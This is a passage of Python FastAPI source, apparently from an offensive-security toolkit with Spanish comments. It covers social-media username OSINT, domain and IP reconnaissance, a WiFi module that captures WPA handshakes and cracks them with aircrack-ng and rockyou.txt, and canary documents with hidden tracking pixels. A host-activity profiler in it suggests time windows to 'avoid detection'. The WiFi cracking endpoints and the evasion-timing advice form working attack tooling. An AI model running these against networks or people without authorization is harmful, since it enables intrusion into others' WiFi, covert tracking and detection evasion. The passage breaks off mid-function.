# Las 5 marcadas "unreliable" devuelven la MISMA respuesta exista o no la
# cuenta desde este tipo de origen (anti-bot) — se reportan como null,
# no se adivina.
SOCIAL_PLATFORMS = [
    ("GitHub", "https://www.github.com/{}", "status_code", None, r"^[a-zA-Z0-9](?:[a-zA-Z0-9]|-(?=[a-zA-Z0-9])){0,38}$", None),
    ("GitLab", "https://gitlab.com/api/v4/users?username={}", "message_means_missing", ["[]"], None, "https://gitlab.com/{}", "vía API oficial de GitLab"),
    ("YouTube", "https://www.youtube.com/@{}", "status_code", None, None, None),
    ("TikTok", "https://www.tiktok.com/@{}", "message_means_missing", ['"statusCode":10221', "Govt. of India decided to block 59 apps"], None, None),
    ("Telegram", "https://t.me/{}", "message_means_missing", ['<div class="tgme_page_context_link_icon">', 'tgme_username_link" href="tg://resolve?domain='], r"^[a-zA-Z0-9_]{3,32}[^_]$", None, "solo detecta usernames públicos indexables"),
    ("Medium", "https://medium.com/feed/@{}", "message_means_missing", ["<body"], None, "https://medium.com/@{}", "vía feed RSS"),
    ("Pinterest", "https://www.pinterest.com/oembed.json?url=https://www.pinterest.com/{}/", "status_code", None, None, "https://www.pinterest.com/{}/"),
    ("Snapchat", "https://www.snapchat.com/add/{}", "status_code", None, r"^[a-z][a-z0-9-_.]{2,14}$", None),
    ("Twitch", "https://www.twitch.tv/{}", "message_means_missing", ["content='Twitch is the world&#39;s leading video platform and community for gamers.'"], None, None),
    ("Steam", "https://steamcommunity.com/id/{}/", "message_means_missing", ["The specified profile could not be found"], None, None),
    # --- Sin verificación confiable sin autenticación (anti-bot confirmado) ---
    ("Instagram", "https://instagram.com/{}", "unreliable", None, None, None, "Instagram devuelve 200/403 igual exista o no la cuenta"),
    ("LinkedIn", "https://www.linkedin.com/in/{}", "unreliable", None, None, None, "LinkedIn bloquea scraping no autenticado"),
    ("Facebook", "https://facebook.com/{}", "unreliable", None, None, None, "Facebook redirige a login para cualquier perfil"),
    ("Reddit", "https://www.reddit.com/user/{}", "unreliable", None, None, None, "Reddit bloquea con 403/challenge anti-bot"),
    ("Twitter/X", "https://x.com/{}", "unreliable", None, None, None, "x.com requiere JS; espejos nitter están caídos"),
]


@app.get("/api/osint/social/{username}")
async def osint_social(username: str):
    cached = _osint_get_cache(username, "social")
    if cached:
        return cached[0]

    from urllib.parse import quote
    raw_username = username.replace("@", "").strip()

    warnings = []
    if " " in raw_username:
        warnings.append(
            "El input contiene espacios — parece un nombre completo, no un "
            "username. Las plataformas con validación de formato marcarán "
            "'formato inválido'. Prueba variantes sin espacios."
        )

    semaphore = asyncio.Semaphore(10)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    results = []

    async def check_platform(client, entry):
        # entry = (name, probe_url, check_type, error_msgs, regex, display_url, note)
        name = entry[0]
        probe_url_tmpl = entry[1]
        check_type = entry[2]
        error_msgs = entry[3] if len(entry) > 3 else None
        regex = entry[4] if len(entry) > 4 else None
        display_url_tmpl = entry[5] if len(entry) > 5 else None
        note = entry[6] if len(entry) > 6 else None

        u = quote(raw_username, safe="")
        display_url = (display_url_tmpl or probe_url_tmpl).replace("{}", u)
        target_url = probe_url_tmpl.replace("{}", u)

        # 1. Validar formato antes de gastar el request
        if regex and not re.match(regex, raw_username):
            results.append({
                "platform": name, "url": display_url,
                "exists": False, "status_code": None,
                "note": "Formato de username inválido para esta plataforma"
            })
            return

        # 2. Plataformas sin verificación confiable
        if check_type == "unreliable":
            results.append({
                "platform": name, "url": display_url,
                "exists": None, "status_code": None,
                "note": note or "No hay forma confiable de verificar sin autenticación"
            })
            return

        async with semaphore:
            try:
                resp = await client.get(target_url)
                status_code = resp.status_code

                if status_code == 429 or status_code == 403:
                    exists = None
                elif check_type == "status_code":
                    exists = (200 <= status_code < 300)
                elif check_type == "message_means_missing":
                    if 200 <= status_code < 300:
                        # NO truncar el body — el marcador puede estar a los ~26KB (Steam)
                        found_error = any(msg in resp.text for msg in (error_msgs or []))
                        exists = not found_error
                    else:
                        exists = False
                else:
                    exists = (200 <= status_code < 300)

                entry_result = {
                    "platform": name, "url": display_url,
                    "exists": exists, "status_code": status_code
                }
                if note:
                    entry_result["note"] = note
                results.append(entry_result)
            except Exception as e:
                results.append({
                    "platform": name, "url": display_url,
                    "exists": False, "status_code": None,
                    "error": str(e)[:100],
                    "note": "Fallo de conexión — no confirmado ni descartado"
                })

    async with httpx.AsyncClient(timeout=10.0, follow_redirects=True, headers=headers) as client:
        await asyncio.gather(
            *[check_platform(client, entry) for entry in SOCIAL_PLATFORMS]
        )

    total_found = sum(1 for r in results if r.get("exists") is True)
    total_unreliable = sum(1 for r in results if r.get("exists") is None)
    result = {
        "username": raw_username,
        "results": results,
        "found": [r for r in results if r.get("exists") is True],
        "unreliable": [r for r in results if r.get("exists") is None],
        "total_found": total_found,
        "total_unreliable": total_unreliable,
        "total_checked": len(results),
        "warnings": warnings,
        "timestamp": datetime.now().isoformat()
    }

    _osint_cache_result(raw_username, "social", result)
    return result

@app.get("/api/osint/cert/{domain}")
async def osint_cert(domain: str):
    cached = _osint_get_cache(domain, "cert")
    if cached:
        return cached[0]

    result = await _helper_get_ssl_cert(domain, 443)
    result["timestamp"] = datetime.now().isoformat()

    _osint_cache_result(domain, "cert", result)
    return result


@app.get("/api/osint/full/{target}")
async def osint_full(target: str):
    cached = _osint_get_cache(target, "full")
    if cached:
        return cached[0]

    is_ip = _valid_ip(target)

    if is_ip:
        async def _rdns_task(ip):
            loop = asyncio.get_running_loop()
            try:
                res = await loop.run_in_executor(None, socket.gethostbyaddr, ip)
                return {"hostname": res[0], "aliases": res[1]}
            except Exception as e:
                return {"hostname": None, "error": str(e)}

        async def _geo_task(ip):
            try:
                async with httpx.AsyncClient(timeout=8.0) as client:
                    resp = await client.get(f"https://ipwho.is/{ip}")
                    if resp.status_code == 200:
                        return resp.json()
            except Exception as e:
                return {"error": str(e)}
            return {}

        async def _threat_task(ip):
            threat_data = {"ip": ip, "is_private": False, "flags": [], "risk_score": 0}
            try:
                ip_obj = ipaddress.ip_address(ip)
                if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved:
                    threat_data["is_private"] = True
                    threat_data["flags"].append("internal/private_ip")
                    threat_data["risk_score"] = 0
                    return threat_data
            except Exception:
                pass

            try:
                async with httpx.AsyncClient(timeout=8.0) as client:
                    resp = await client.get(f"https://ipwho.is/{ip}")
                    if resp.status_code == 200:
                        data = resp.json()
                        security = data.get("security", {})
                        if security.get("vpn"):
                            threat_data["flags"].append("vpn")
                            threat_data["risk_score"] += 20
                        if security.get("proxy"):
                            threat_data["flags"].append("proxy")
                            threat_data["risk_score"] += 30
                        if security.get("tor"):
                            threat_data["flags"].append("tor")
                            threat_data["risk_score"] += 50
                        if security.get("hosting"):
                            threat_data["flags"].append("datacenter/hosting")
                            threat_data["risk_score"] += 10
            except Exception as e:
                threat_data["error"] = str(e)

            return threat_data

        rdns_res, geo_res, threat_res = await asyncio.gather(
            _rdns_task(target),
            _geo_task(target),
            _threat_task(target)
        )

        full_report = {
            "target": target,
            "target_type": "ip",
            "timestamp": datetime.now().isoformat(),
            "rdns": rdns_res,
            "geo": geo_res,
            "threat_intel": threat_res
        }
    else:
        async def _whois_task(domain):
            try:
                proc = await asyncio.create_subprocess_exec(
                    "whois", domain,
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
                output = stdout.decode()
                parsed = {}
                for line in output.split("\n"):
                    if ":" in line and not line.startswith("%"):
                        k, v = line.split(":", 1)
                        k = k.strip()
                        v = v.strip()
                        if k and v and k not in parsed:
                            parsed[k] = v
                return {"raw": output[:3000], "parsed": parsed}
            except Exception as e:
                return {"error": str(e)}

        async def _subdomains_task(domain):
            try:
                return await _fetch_crtsh(domain)
            except Exception as e:
                return [{"error": str(e)}]

        async def _dns_task(domain):
            record_types = ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA"]
            records = {}

            async def fetch_record(rt):
                try:
                    proc = await asyncio.create_subprocess_exec(
                        "dig", "+short", rt, domain,
                        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                    )
                    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
                    lines = [l.strip() for l in stdout.decode().splitlines() if l.strip() and not l.strip().startswith(";")]
                    return rt, lines
                except Exception:
                    return rt, []

            results = await asyncio.gather(*[fetch_record(rt) for rt in record_types])
            for rt, lines in results:
                records[rt] = lines
            return records

        async def _headers_task(domain):
            headers = {}
            status_code = None
            url_used = None
            for scheme in ["https", "http"]:
                try:
                    async with httpx.AsyncClient(follow_redirects=True, timeout=8.0, verify=False) as client:
                        resp = await client.get(f"{scheme}://{domain}")
                        headers = dict(resp.headers)
                        status_code = resp.status_code
                        url_used = str(resp.url)
                        break
                except Exception:
                    pass
            techs = _detect_technologies(headers)
            return {"url": url_used, "status_code": status_code, "headers": headers, "technologies": techs}

        async def _cert_task(domain):
            try:
                return await _helper_get_ssl_cert(domain, 443)
            except Exception as e:
                return {"error": str(e)}

        whois_res, subdomains_res, dns_res, headers_res, cert_res = await asyncio.gather(
            _whois_task(target),
            _subdomains_task(target),
            _dns_task(target),
            _headers_task(target),
            _cert_task(target)
        )

        full_report = {
            "target": target,
            "target_type": "domain",
            "timestamp": datetime.now().isoformat(),
            "whois": whois_res,
            "subdomains": subdomains_res,
            "dns": dns_res,
            "headers": headers_res,
            "cert": cert_res
        }

    _osint_cache_result(target, "full", full_report)
    return full_report


@app.get("/api/osint/export/{target}")
async def osint_export(target: str):
    cached = _osint_get_cache(target, "full")
    if cached:
        report = cached[0]
    else:
        report = await osint_full(target)

    return JSONResponse(
        content=report,
        headers={"Content-Disposition": f'attachment; filename="osint_report_{target}.json"'}
    )


# == END OSINT ENGINE =================================================


# ============================================================
# MÓDULO 5: WIFI SCANNER (termux-api / iw / airodump-ng)
# ============================================================

WIFI_CAPTURES_DIR = str(DATA_DIR / "wifi_captures")
os.makedirs(WIFI_CAPTURES_DIR, exist_ok=True)
_wifi_active_captures = {}

@app.get("/api/wifi/scan")
async def wifi_scan():
    """Escaneo de redes WiFi — intenta termux-api, luego iw, luego airodump-ng."""
    networks = []

    # Intento 1: termux-wifi-scaninfo (no requiere root)
    try:
        result = await asyncio.to_thread(lambda: subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=15))
        if result.returncode == 0:
            data = json.loads(result.stdout)
            for net in data:
                networks.append({
                    "bssid": net.get("bssid", "unknown"),
                    "ssid": net.get("ssid", "Hidden"),
                    "channel": int(net.get("channel", 0)),
                    "encryption": net.get("capabilities", "Unknown"),
                    "signal": int(net.get("rssi", -100)),
                    "vendor": net.get("operatorFriendlyName", "Unknown"),
                    "wps": False
                })
            return {"networks": networks, "method": "termux-api"}
    except Exception:
        pass

    # Intento 2: iw (Linux/Kali, requiere root en Android)
    try:
        result = await asyncio.to_thread(lambda: subprocess.run(["iw", "dev", "wlan0", "scan"], capture_output=True, text=True, timeout=20))
        if result.returncode == 0:
            current = {}
            for line in result.stdout.split("\n"):
                line = line.strip()
                if line.startswith("BSS "):
                    if current and "bssid" in current:
                        networks.append({
                            "bssid": current.get("bssid", "unknown"),
                            "ssid": current.get("ssid", "Hidden"),
                            "channel": current.get("channel", 0),
                            "encryption": current.get("encryption", "Open"),
                            "signal": current.get("signal", -100),
                            "vendor": "Unknown", "wps": False
                        })
                    current = {"bssid": line.split()[1].strip("()")}
                elif "SSID:" in line and "Extended" not in line:
                    current["ssid"] = line.split(":", 1)[1].strip()
                elif "signal:" in line:
                    import re as _re
                    match = _re.search(r"(-\d+\.\d+)", line)
                    current["signal"] = int(float(match.group(1))) if match else -100
                elif "DS Parameter set:" in line:
                    import re as _re
                    match = _re.search(r"channel (\d+)", line)
                    current["channel"] = int(match.group(1)) if match else 0
                elif "RSN:" in line:
                    current["encryption"] = "WPA2"
                elif "WPA:" in line:
                    current["encryption"] = "WPA"
                elif "Privacy" in line and "encryption" not in current:
                    current["encryption"] = "WEP"

            if current and "bssid" in current:
                networks.append({
                    "bssid": current.get("bssid", "unknown"),
                    "ssid": current.get("ssid", "Hidden"),
                    "channel": current.get("channel", 0),
                    "encryption": current.get("encryption", "Open"),
                    "signal": current.get("signal", -100),
                    "vendor": "Unknown", "wps": False
                })
            return {"networks": networks, "method": "iw"}
    except Exception:
        pass

    # Intento 3: airodump-ng (requiere modo monitor + root)
    try:
        await asyncio.to_thread(lambda: subprocess.run(["which", "airodump-ng"], capture_output=True, check=True))
        csv_file = os.path.join(WIFI_CAPTURES_DIR, "scan-01.csv")
        for f in os.listdir(WIFI_CAPTURES_DIR):
            if f.startswith("scan-"):
                os.remove(os.path.join(WIFI_CAPTURES_DIR, f))

        proc = subprocess.Popen(
            ["airodump-ng", "wlan0mon", "-w", os.path.join(WIFI_CAPTURES_DIR, "scan"),
             "--write-interval", "1", "--output-format", "csv"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        await asyncio.sleep(10)
        proc.terminate()
        try: proc.wait(timeout=5)
        except: proc.kill()

        if os.path.exists(csv_file):
            with open(csv_file, "r") as f:
                lines = f.readlines()
            for line in lines[2:]:
                if not line.strip() or "BSSID" in line:
                    continue
                parts = line.strip().split(",")
                if len(parts) >= 14:
                    networks.append({
                        "bssid": parts[0].strip(),
                        "ssid": parts[13].strip() if len(parts) > 13 else "Hidden",
                        "channel": int(parts[3].strip()) if parts[3].strip().isdigit() else 0,
                        "encryption": parts[5].strip() if parts[5].strip() else "Open",
                        "signal": int(parts[8].strip()) if parts[8].strip().lstrip("-").isdigit() else -100,
                        "vendor": "Unknown", "wps": False
                    })
            return {"networks": networks, "method": "airodump-ng"}
    except Exception:
        pass

    if not networks:
        return {
            "networks": [], "method": "none",
            "note": "Ningun metodo funciono. Termux: instala termux-api + permisos de ubicacion. Kali: iw o airodump-ng (root + modo monitor)."
        }
    return {"networks": networks, "method": "unknown"}

@app.post("/api/wifi/capture/{bssid}")
async def wifi_capture_handshake(bssid: str, ssid: str = "", channel: int = 1, duration: int = 30):
    """Captura handshake WPA/WPA2 con airodump-ng. Requiere modo monitor + root."""
    capture_id = f"{bssid.replace(':', '')}_{datetime.now().strftime('%H%M%S')}"
    cap_file = os.path.join(WIFI_CAPTURES_DIR, capture_id)

    # Verificar modo monitor
    try:
        result = await asyncio.to_thread(lambda: subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5))
        if "wlan0mon" not in result.stdout:
            return JSONResponse({
                "error": "Interfaz wlan0mon no encontrada",
                "fix": "airmon-ng start wlan0 (requiere root)"
            }, status_code=503)
    except Exception:
        pass

    try:
        cmd = ["airodump-ng", "wlan0mon", "--bssid", bssid, "-c", str(channel),
               "-w", cap_file, "--output-format", "pcap"]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        _wifi_active_captures[bssid] = {"process": proc, "capture_id": capture_id, "start_time": datetime.now()}

        await asyncio.sleep(duration)

        proc.terminate()
        try: proc.wait(timeout=10)
        except: proc.kill()

        cap_file_real = cap_file + "-01.cap"
        has_handshake = False
        if os.path.exists(cap_file_real):
            check = await asyncio.to_thread(lambda: subprocess.run(["aircrack-ng", cap_file_real], capture_output=True, text=True))
            has_handshake = "handshake" in check.stdout.lower()

        if bssid in _wifi_active_captures:
            del _wifi_active_captures[bssid]

        await broadcast({"type": "wifi", "payload": f"Handshake {ssid}: {'capturado' if has_handshake else 'no capturado'}"})
        return {
            "bssid": bssid, "ssid": ssid,
            "capture_file": cap_file_real,
            "has_handshake": has_handshake,
            "duration": duration,
            "status": "handshake_captured" if has_handshake else "no_handshake"
        }
    except Exception as e:
        if bssid in _wifi_active_captures:
            _wifi_active_captures[bssid]["process"].kill()
            del _wifi_active_captures[bssid]
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/wifi/crack/{bssid}")
async def wifi_crack(bssid: str, wordlist: str = "/usr/share/wordlists/rockyou.txt"):
    """Crackea handshake con aircrack-ng."""
    bssid_clean = bssid.replace(":", "")
    matching_caps = []

    for f in os.listdir(WIFI_CAPTURES_DIR):
        if f.startswith(bssid_clean) and f.endswith(".cap"):
            matching_caps.append(os.path.join(WIFI_CAPTURES_DIR, f))

    if not matching_caps:
        raise HTTPException(status_code=404, detail="No se encontro captura para este BSSID")

    cap_file = max(matching_caps, key=os.path.getctime)

    if not os.path.exists(wordlist):
        return JSONResponse({
            "error": f"Wordlist no encontrada: {wordlist}",
            "suggestion": "Descarga rockyou.txt"
        }, status_code=404)

    try:
        proc = await asyncio.create_subprocess_exec(
            "aircrack-ng", cap_file, "-w", wordlist, "-b", bssid,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=300)
        output = stdout.decode()

        import re as _re
        key_match = _re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", output)
        if key_match:
            await broadcast({"type": "wifi", "payload": f"WiFi crackeado: {ssid} key={key_match.group(1)}"})
            return {"bssid": bssid, "status": "cracked", "key": key_match.group(1), "capture_file": cap_file}
        else:
            return {"bssid": bssid, "status": "failed", "reason": "Key no encontrada en wordlist", "capture_file": cap_file}
    except asyncio.TimeoutError:
        return {"status": "timeout", "message": "Crackeo excedio 5 minutos. Usa hashcat en GPU."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/wifi/captures")
async def wifi_list_captures():
    files = []
    for f in os.listdir(WIFI_CAPTURES_DIR):
        if f.endswith(".cap"):
            path = os.path.join(WIFI_CAPTURES_DIR, f)
            stat = os.stat(path)
            files.append({"file": f, "size": stat.st_size, "created": datetime.fromtimestamp(stat.st_mtime).isoformat()})
    return {"captures": files}

@app.delete("/api/wifi/captures/{filename}")
async def wifi_delete_capture(filename: str):
    path = os.path.join(WIFI_CAPTURES_DIR, filename)
    if os.path.exists(path):
        os.remove(path)
        return {"deleted": filename}
    raise HTTPException(status_code=404, detail="Archivo no encontrado")

# == END WIFI SCANNER =================================================

# ============================================================
# MÓDULO 6: BLACK MIRROR (Canary Forge + Shadow Twin + Ghostprint + Chaos)
# ============================================================

BM_DB = str(DATA_DIR / "blackmirror.db")
CANARY_DIR = str(DATA_DIR / "canary_docs")
SHADOW_DIR = str(DATA_DIR / "shadow_configs")
os.makedirs(CANARY_DIR, exist_ok=True)
os.makedirs(SHADOW_DIR, exist_ok=True)

def _init_bm_db():
    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS bm_canaries (
        id TEXT PRIMARY KEY, recipient TEXT, doc_type TEXT,
        token TEXT, created TEXT, triggered TEXT, trigger_ip TEXT, trigger_ua TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS ghostprints (
        host TEXT, hour INTEGER, day_of_week INTEGER,
        seen INTEGER, avg_rtt REAL, last_seen TEXT,
        PRIMARY KEY (host, hour, day_of_week)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS chaos_rules (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        real_service TEXT, fake_banner TEXT, fake_os TEXT,
        port INTEGER, active INTEGER DEFAULT 1
    )''')
    conn.commit()
    conn.close()

_init_bm_db()

# ─── 1. CANARY FORGE ─────────────────────────────────────────────

def _bm_canary_token(recipient: str, doc_id: str) -> str:
    return _hashlib.sha256(f"{recipient}:{doc_id}:{os.urandom(16).hex()}".encode()).hexdigest()[:32]

def _create_canary_pdf(recipient: str, title: str, content: str, token: str, doc_id: str) -> str:
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas
        from reportlab.lib.units import inch
    except ImportError:
        raise HTTPException(status_code=503, detail="Instala: pip install reportlab")

    filepath = os.path.join(CANARY_DIR, f"canary_{doc_id}.pdf")
    c = canvas.Canvas(filepath, pagesize=letter)
    width, height = letter

    c.setFont("Helvetica-Bold", 16)
    c.drawString(1*inch, height - 1*inch, title)
    c.setFont("Helvetica", 11)
    text_obj = c.beginText(1*inch, height - 1.5*inch)
    for line in content.split('\n'):
        text_obj.textLine(line)
    c.drawText(text_obj)

    # Watermark invisible
    c.setFont("Helvetica", 1)
    c.setFillColorRGB(0.999, 0.999, 0.999)
    c.drawString(0.1*inch, 0.1*inch, f"BM-{token}")

    # Metadatos unicos
    c.setAuthor(f"{recipient} - {token[:8]}")
    c.setTitle(title)
    c.setSubject(f"BM:{token}")
    c.setKeywords(f"canary,{recipient},{doc_id}")
    c.setCreator(f"BlackMirror/1.0/{token}")
    c.save()
    return filepath

def _create_canary_html(recipient: str, title: str, content: str, token: str, doc_id: str) -> str:
    filepath = os.path.join(CANARY_DIR, f"canary_{doc_id}.html")
    bug_url = f"/api/blackmirror/canary/ping/{token}"
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{title}</title>
    <meta name="author" content="{recipient}">
    <meta name="generator" content="BM-{token}">
</head>
<body>
    <h1>{title}</h1>
    <p>{content.replace(chr(10), '</p><p>')}</p>
    <img src="{bug_url}" width="1" height="1" style="display:none" alt="" />
    <!-- {token} -->
</body>
</html>"""
    with open(filepath, "w") as f:
        f.write(html)
    return filepath

@app.post("/api/blackmirror/canary/forge")
async def bm_forge_canary(recipient: str = Query(...), doc_type: str = Query("html"),
                          title: str = Query("Documento Confidencial"),
                          content: str = Query("Este documento contiene informacion sensible.")):
    doc_id = str(uuid.uuid4())[:12]
    token = _bm_canary_token(recipient, doc_id)

    if doc_type == "pdf":
        path = _create_canary_pdf(recipient, title, content, token, doc_id)
    elif doc_type == "html":
        path = _create_canary_html(recipient, title, content, token, doc_id)
    else:
        raise HTTPException(status_code=400, detail="Tipo soportado: pdf, html")

    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute("INSERT INTO bm_canaries VALUES (?, ?, ?, ?, ?, NULL, NULL, NULL)",
              (doc_id, recipient, doc_type, token, datetime.now().isoformat()))
    conn.commit()
    conn.close()

    await broadcast({"type": "blackmirror", "payload": f"Canary forjado para {recipient} ({doc_type})"})
    return {
        "doc_id": doc_id, "recipient": recipient, "token": token,
        "file": path, "type": doc_type,
        "warning": "Distribuye este documento como si fuera real. Si se filtra, el token te delata al traidor."
    }

@app.get("/api/blackmirror/canary/ping/{token}")
async def bm_canary_ping(token: str, request: Request):
    """Web bug: se activa cuando alguien abre el documento HTML."""
    forwarded = request.headers.get("X-Forwarded-For")
    ip = forwarded.split(",")[0].strip() if forwarded else (request.client.host if request.client else "unknown")
    ua = request.headers.get("User-Agent", "Unknown")

    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute("SELECT id, recipient FROM bm_canaries WHERE token = ?", (token,))
    row = c.fetchone()

    if row:
        doc_id, recipient = row
        c.execute("""UPDATE bm_canaries SET triggered = ?, trigger_ip = ?, trigger_ua = ?
                     WHERE token = ?""", (datetime.now().isoformat(), ip, ua, token))
        conn.commit()
        conn.close()
        print(f"\n[CANARY TRIGGERED] Doc: {doc_id} | Recipient: {recipient} | IP: {ip} | UA: {ua}\n")
        await broadcast({"type": "blackmirror", "payload": f"CANARY TRIGGERED: {recipient} desde {ip}"})
    else:
        conn.close()

    # 1x1 transparent GIF
    gif_bytes = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
    return Response(content=gif_bytes, media_type="image/gif")

@app.get("/api/blackmirror/canary/status")
async def bm_canary_status():
    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute("SELECT * FROM bm_canaries ORDER BY created DESC")
    rows = c.fetchall()
    conn.close()
    return {"canaries": [
        {"id": r[0], "recipient": r[1], "type": r[2], "token": r[3],
         "created": r[4], "triggered": r[5], "trigger_ip": r[6], "trigger_ua": r[7],
         "compromised": r[5] is not None}
        for r in rows
    ]}

# ─── 2. SHADOW TWIN ──────────────────────────────────────────────

@app.post("/api/blackmirror/shadow/twin")
async def bm_shadow_twin(scan_result: dict):
    """Genera configs de honeypots que imitan servicios detectados."""
    hosts = scan_result.get("hosts", [])
    if not hosts:
        # Usar hosts del store si no se pasan
        hosts = scan_result.get("data", [])

    if not hosts:
        raise HTTPException(status_code=400, detail="Se requiere resultado de escaneo con hosts")

    configs = []
    for host in hosts:
        ip = host.get("ip", host.get("address", "unknown"))
        for port in host.get("ports", []):
            service = port.get("service", "unknown")
            port_num = port.get("port", 0)

            config = {
                "type": "honeypot",
                "mimics": {"ip": ip, "port": port_num, "service": service},
                "listeners": [], "traps": []
            }

            if service in ["ssh", "telnet"]:
                config["listeners"].append({
                    "port": port_num + 10000, "protocol": "tcp",
                    "banner": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
                    "trap": "fake_shell",
                    "commands": {"whoami": "root", "id": "uid=0(root) gid=0(root)"}
                })
                config["traps"].append("credentials_honeytrap")
            elif service in ["http", "https"]:
                config["listeners"].append({
                    "port": port_num + 10000, "protocol": "tcp",
                    "banner": "Server: nginx/1.18.0",
                    "trap": "fake_admin_panel",
                    "pages": ["/admin", "/login", "/config"]
                })
                config["traps"].append("sql_injection_honeytrap")
            elif service == "ftp":
                config["listeners"].append({
                    "port": port_num + 10000, "protocol": "tcp",
                    "banner": "220 ProFTPD 1.3.5 Server",
                    "trap": "fake_ftp",
                    "files": ["backup.zip", "credentials.xlsx", "secret.pdf"]
                })
                config["traps"].append("file_exfil_honeytrap")

            config_path = os.path.join(SHADOW_DIR, f"shadow_{ip}_{port_num}.json")
            with open(config_path, "w") as f:
                json.dump(config, f, indent=2)

            configs.append({
                "target": f"{ip}:{port_num}", "service": service,
                "shadow_port": port_num + 10000, "config_file": config_path,
                "traps": config["traps"]
            })

    # Script de despliegue
    deploy_script = os.path.join(SHADOW_DIR, "deploy_shadows.sh")
    with open(deploy_script, "w") as f:
        f.write("#!/bin/bash\n# Shadow Twin Deployer\n")
        for c in configs:
            f.write(f"echo '[+] Levantando honeypot para {c['target']} en puerto {c['shadow_port']}'\n")
            f.write(f"nc -l -p {c['shadow_port']} &\n")
        f.write("wait\n")
    os.chmod(deploy_script, 0o755)

    await broadcast({"type": "blackmirror", "payload": f"Shadow Twin: {len(configs)} honeypots generados"})
    return {
        "shadows_generated": len(configs), "configs": configs,
        "deploy_script": deploy_script,
        "note": "Los honeypots usan puerto real + 10000. Modifica el offset segun tu red."
    }

# ─── 3. GHOSTPRINT ───────────────────────────────────────────────

@app.post("/api/blackmirror/ghostprint/learn")
async def bm_ghostprint_learn(scan_data: dict):
    """Alimenta con resultados de escaneo periodicos para aprender patrones."""
    host = scan_data.get("host")
    rtt = float(scan_data.get("rtt", 0))
    hour = datetime.now().hour
    dow = datetime.now().weekday()

    if not host:
        raise HTTPException(status_code=400, detail="Se requiere host")

    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute("SELECT seen, avg_rtt FROM ghostprints WHERE host = ? AND hour = ? AND day_of_week = ?",
              (host, hour, dow))
    row = c.fetchone()

    if row:
        seen, old_rtt = row
        new_rtt = (old_rtt * seen + rtt) / (seen + 1)
        c.execute("""UPDATE ghostprints SET seen = ?, avg_rtt = ?, last_seen = ?
                     WHERE host = ? AND hour = ? AND day_of_week = ?""",
                  (seen + 1, new_rtt, datetime.now().isoformat(), host, hour, dow))
    else:
        c.execute("INSERT INTO ghostprints VALUES (?, ?, ?, 1, ?, ?)",
                  (host, hour, dow, rtt, datetime.now().isoformat()))

    conn.commit()
    conn.close()
    return {"status": "learned", "host": host, "hour": hour, "day": dow}

@app.get("/api/blackmirror/ghostprint/profile/{host}")
async def bm_ghostprint_profile(host: str):
    """Devuelve el perfil semanal de un host y detecta anomalias."""
    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute("SELECT hour, day_of_week, seen, avg_rtt FROM ghostprints WHERE host = ? ORDER BY day_of_week, hour",
              (host,))
    rows = c.fetchall()
    conn.close()

    if not rows:
        return {"host": host, "profile": "insufficient_data",
                "message": "Necesito minimo 7 dias de escaneos periodicos."}

    profile = {}
    total_seen = sum(r[2] for r in rows)

    for hour, dow, seen, rtt in rows:
        key = f"{dow}:{hour}"
        probability = seen / total_seen if total_seen > 0 else 0
        profile[key] = {"probability": round(probability, 3), "seen": seen, "avg_rtt": round(rtt, 2)}

    now = datetime.now()
    current_key = f"{now.weekday()}:{now.hour}"
    current_prob = profile.get(current_key, {}).get("probability", 0)

    anomaly = None
    if current_prob < 0.05 and total_seen > 50:
        anomaly = {
            "type": "GHOST_ANOMALY", "severity": "HIGH",
            "message": f"{host} esta activo ahora pero su probabilidad historica a esta hora es {current_prob:.1%}",
            "usual_hours": [k for k, v in profile.items() if v["probability"] > 0.1]
        }

    return {
        "host": host, "total_observations": total_seen,
        "current_hour_probability": current_prob,
        "profile": profile, "anomaly": anomaly,
        "recommendation": "Operar durante horas de baja probabilidad para evitar deteccion." if not anomaly else "INVESTIGAR: Host activo fuera de patron."
    }

@app.get("/api/blackmirror/ghostprint/window/{host}")
async def bm_ghostprint_window(host: str):
    """Sugiere la mejor ventana temporal para operar contra este host."""
    conn = _sqlite3.connect(BM_DB)
    c = conn.cursor()
    c.execute("SELECT hour, day_of_week, seen FROM ghostprints WHERE host = ?", (host,))
    rows = c.fetchall()
    conn.close()

    all_slots = [(h, d, s) for h, d, s in rows]
    all_slots.sort(key=lambda x: x[2])

    days = ["Lun", "Mar", "Mie", "Jue", "Vie", "Sab", "Dom"]
    best_windows = []
